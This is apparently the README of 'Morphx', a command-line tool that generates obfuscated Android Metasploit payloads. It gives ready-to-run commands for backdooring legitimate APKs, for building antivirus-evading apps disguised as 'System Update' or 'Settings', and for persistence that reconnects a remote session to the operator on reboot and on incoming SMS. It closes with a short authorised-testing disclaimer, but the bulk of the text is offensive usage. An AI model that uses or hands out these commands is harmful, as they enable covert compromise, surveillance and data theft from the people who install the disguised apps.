 
![interface](https://github.com/user-attachments/assets/13ecfb76-b02c-48fd-b566-e936609ccd92)

# Morphx – Obfuscated Android Payload Generator

**Morphx** is a command‑line tool for creating Android payloads and backdooring existing APKs.  
It wraps **msfvenom** and **apktool** to generate stand‑alone payloads (with AV evasion) or inject a payload into a legitimate app.

## ✨ Features

- **Backdoor** an existing APK (multi‑dex support, `--use-aapt2` for stubborn apps)
- **Bypass AV** stand‑alone payload with renamed classes, custom icon and app name
- **Stealth persistence** – starts the service on boot **and** on any incoming SMS
- Fully self‑contained – just drop your `apktool.jar`, `aapt`, `aapt2` into the `input/` folder


## 🔧 Requirements

- Python 3.6+
- `msfvenom` (Metasploit Framework)
- `java`, `keytool`, `zipalign`
- `apksigner` (optional but recommended for Android 11+)
- `Pillow` (for icon processing) → `pip install Pillow`
- **apktool** – either installed system‑wide, or place `apktool.jar` in `input/`

## 🚀 Quick start

```bash
# Clone the repository
git clone https://github.com/hxrofo/morphx.git
cd morphx

# (Optional) Create a virtual environment and install Pillow
python3 -m venv venv && source venv/bin/activate
pip install Pillow

# Make script executable
chmod +x morphx.py

# Run as root
sudo python3 morphx.py <mode> [options]

## Usage

1. Backdoor an existing APK
sudo python3 morphx.py backdoor \
    --lhost 192.168.1.10 \
    --lport 4444 \
    --original original.apk \
    --out evil

If you encounter `aapt` errors, add `--use-aapt2`:

2. Bypass AV (stand‑alone payload)
sudo python3 morphx.py bypass \
    --lhost 192.168.1.10 \
    --lport 4444 \
    --name "System Update" \
    --icon myicon.png \
    --out update

3. Stealth persistence
sudo python3 morphx.py stealth \
    --lhost 192.168.1.10 \
    --lport 4444 \
    --name "Settings" \
    --icon gear.png \
    --out stealth

**How it works:**

Tap the app once – it opens and immediately closes (starting the background service).

After that, the payload will reconnect on every reboot and on any incoming SMS.

🧰 How to supply your own apktool / aapt binaries

1. Create an `input` folder next to `morphx.py`.
2. Place `apktool.jar` and your .png icons (optionally `aapt`, `aapt2`, `apktool` wrapper) inside.
3. The script will automatically use them instead of the system versions.

⚠️ Disclaimer

This tool is intended for **educational and authorised security testing only**.  
The authors are not responsible for any misuse. Always obtain proper consent before testing.
